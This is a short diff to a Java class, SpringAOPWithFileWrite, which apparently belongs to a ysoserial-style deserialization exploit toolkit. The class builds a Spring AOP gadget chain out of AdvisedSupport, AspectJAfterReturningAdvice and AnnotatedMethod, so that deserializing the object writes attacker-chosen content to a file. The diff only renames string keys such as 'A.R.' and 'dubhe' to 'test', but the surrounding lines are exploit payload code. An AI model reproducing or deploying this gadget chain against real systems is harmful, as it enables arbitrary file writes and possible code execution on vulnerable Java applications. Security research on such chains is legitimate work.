@@ -45,10 +45,10 @@ public class SpringAOPWithFileWrite extends PayloadRunner implements CommandObje
         File file=new File(filename);
 
         HashMap<String, Object[]> hashMap = new HashMap<>();
-        hashMap.put("A.R.", new Object[]{content,file});
+        hashMap.put("test", new Object[]{content,file});
 
         Hashtable<String, String> hashtable = new Hashtable<>();
-        hashtable.put("A.R.", "any");
+        hashtable.put("test", "any");
 
         AdvisedSupport advisedSupport = new AdvisedSupport();
         advisedSupport.setTarget(hashMap);
@@ -82,8 +82,8 @@ public class SpringAOPWithFileWrite extends PayloadRunner implements CommandObje
         AnnotatedMethod annotatedMethod = new AnnotatedMethod(null,method,null,null);
         SingletonAspectInstanceFactory aspectInstanceFactory = new SingletonAspectInstanceFactory(annotatedMethod);
         AspectJAfterReturningAdvice advice = new AspectJAfterReturningAdvice(AnnotatedMethod.class.getMethod("call", Object[].class), new AspectJExpressionPointcut(), aspectInstanceFactory);
-        advice.setArgumentNames("dubhe");
-        advice.setReturningName("dubhe");
+        advice.setArgumentNames("test");
+        advice.setReturningName("test");
         return advice;
     }
 
